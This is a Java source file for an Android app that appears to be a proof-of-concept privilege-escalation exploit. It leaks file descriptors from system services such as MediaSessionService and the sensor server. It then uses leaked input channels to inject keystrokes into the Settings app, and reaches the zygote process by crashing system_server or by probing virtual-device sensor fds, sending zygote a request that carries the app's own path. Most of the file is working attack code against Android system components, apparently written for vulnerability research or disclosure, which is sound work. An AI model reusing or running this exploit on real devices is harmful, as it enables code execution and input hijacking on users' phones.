package com.example.thisseemswrong;

import static com.example.thisseemswrong.GrabZygote.isZygote;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.Spinner;
import android.widget.TextView;

public class MainActivity extends Activity {

    static final String TAG = "ThisSeemsWrong";
    static final int MODE_INJECT_EVENTS = 0;
    static final int MODE_GRAB_ZYGOTE_VIA_REBOOT = 1;
    static final int MODE_GRAB_ZYGOTE_VIA_SENSOR = 2;
    static final int MODE_TEST_SERVICE = 3;

    void doAllStuff(int mode) throws Exception {
        MiscUtils.allowHiddenApis();
        if (mode == MODE_GRAB_ZYGOTE_VIA_REBOOT) {
            RebootBackgroundRunner.start(this);
            Thread.sleep(500);
            RebootBackgroundRunner.crashSystemServer();
            return;
        }
        if (mode == MODE_TEST_SERVICE) {
            if (mTestService == null) {
                log("TestService wasn't ready yet");
                return;
            }
            FdLeaker fdLeaker = new FdLeaker(mTestService.getMediaSessionService());
            fdLeaker.startLeak(FdLeaker.buildSingleConfig(1, 2));
            mTestService.openSomeFds();
            MiscUtils.logInfoAboutFds(fdLeaker.finishLeak(5), this::log);
            return;
        }
        FdLeaker fdLeaker = new FdLeaker(FdLeaker.getSystemMediaSessionService());
        if (mode == MODE_GRAB_ZYGOTE_VIA_SENSOR) {
            log("Attempting to find VirtualDevice id");
            boolean foundDevice = false;
            outer:
            for (int virtualDeviceId = 1; virtualDeviceId < 32; virtualDeviceId++) {
                fdLeaker.startLeak(FdLeaker.buildSingleConfig(0, 1));
                MiscUtils.dupFdThroughSensorServer(virtualDeviceId, 0);
                ParcelFileDescriptor[] probePfds = fdLeaker.finishLeak(0);
                if (probePfds.length != 0) {
                    foundDevice = true;
                    log("VirtualDevice id=" + virtualDeviceId);
                    for (int i = 3; i < 400; i++) {
                        Thread.sleep(100);
                        log("device=" + virtualDeviceId + " fd=" + i);
                        fdLeaker.startLeak(FdLeaker.buildSingleConfig(0, 1));
                        MiscUtils.dupFdThroughSensorServer(virtualDeviceId, i);
                        ParcelFileDescriptor[] pfds = fdLeaker.finishLeak(0);
                        MiscUtils.logInfoAboutFds(pfds, this::log);
                        if (pfds.length != 0 && isZygote(pfds[0])) {
                            log("Found zygote, sending request");
                            GrabZygote.sendRequestToZygote(pfds[0], getApplicationInfo().sourceDir);
                            break outer;
                        }
                    }
                }
            }
            if (!foundDevice) {
                log("VirtualDevice found, this mode requires VirtualDevice sensor (Nearby App Streaming (?)) to be active, see VirtualDeviceReg class for details");
            }
            return;
        }
        log("Starting soon, don't touch during demo");
        Thread.sleep(2000);
        log("Starting");
        fdLeaker.startLeak(FdLeaker.buildSingleConfig(0, 20));
        startActivity(new Intent(Settings.ACTION_DEVICE_INFO_SETTINGS));
        Thread.sleep(800);
        ParcelFileDescriptor[] pfds;
        pfds = fdLeaker.finishLeak(30);
        MiscUtils.logInfoAboutFds(pfds, this::log);
        for (ParcelFileDescriptor pfd : pfds) {
            if (InputSender.looksLikeInputChannel(pfd)) {
                InputSender inputSender = new InputSender(pfd);
                inputSender.sendDownAndUp(KeyEvent.KEYCODE_TAB, 20);
                inputSender.sendDownAndUp(KeyEvent.KEYCODE_TAB, 20);
                inputSender.sendDownAndUp(KeyEvent.KEYCODE_DPAD_UP, 20);
                inputSender.sendDownAndUp(KeyEvent.KEYCODE_DPAD_UP, 20);
                inputSender.sendDownAndUp(KeyEvent.KEYCODE_DPAD_UP, 20);
                fdLeaker.startLeak(FdLeaker.buildSingleConfig(0, 10));
                inputSender.sendDownAndUp(KeyEvent.KEYCODE_ENTER, 500);
                pfds = fdLeaker.finishLeak(20);
                for (ParcelFileDescriptor pfd2 : pfds) {
                    if (InputSender.looksLikeInputChannel(pfd2)) {
                        inputSender = new InputSender(pfd2);
                        inputSender.sendText("key injection demo");
                        break;
                    }
                }
                break;
            }
        }
    }

    TextView mTextView;
    Spinner mModeSpinner;
    Button mStartButton;
    StringBuilder mTextBuilder = new StringBuilder();
    SC mServiceConnection;
    ITestService mTestService;
    BroadcastReceiver mShellcodeReceiver;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);
        mTextView = findViewById(R.id.sample_text);
        mModeSpinner = findViewById(R.id.mode_spinner);
        mStartButton = findViewById(R.id.start_button);

        mModeSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                if (position == MODE_TEST_SERVICE && mServiceConnection == null) {
                    mServiceConnection = new SC();
                    bindService(new Intent(MainActivity.this, TestService.class), mServiceConnection, BIND_AUTO_CREATE);
                }
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
            }
        });

        mShellcodeReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                log(intent.getStringExtra("a"));
            }
        };
        registerReceiver(mShellcodeReceiver, new IntentFilter("com.example.thisseemswrong.SHELLCODE_REPORT"), Context.RECEIVER_EXPORTED);
    }

    @Override
    protected void onDestroy() {
        if (mServiceConnection != null) {
            unbindService(mServiceConnection);
        }
        unregisterReceiver(mShellcodeReceiver);
        super.onDestroy();
    }

    public void doStartStuff(View view) {
        mStartButton.setEnabled(false);
        int mode = mModeSpinner.getSelectedItemPosition();
        new Thread(() -> {
            try {
                doAllStuff(mode);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            runOnUiThread(() -> mStartButton.setEnabled(true));
        }, "DoAllStuff").start();
    }

    void log(String message) {
        Log.v(TAG, message);
        runOnUiThread(() -> {
            mTextBuilder.append(message).append('\n');
            mTextView.setText(mTextBuilder);
        });
    }

    class SC implements ServiceConnection {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            mTestService = ITestService.Stub.asInterface(service);
            try {
                log("TestService pid=" + mTestService.getTestServicePid());
            } catch (RemoteException e) {
                log("TestService RemoteException");
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
        }
    }
}
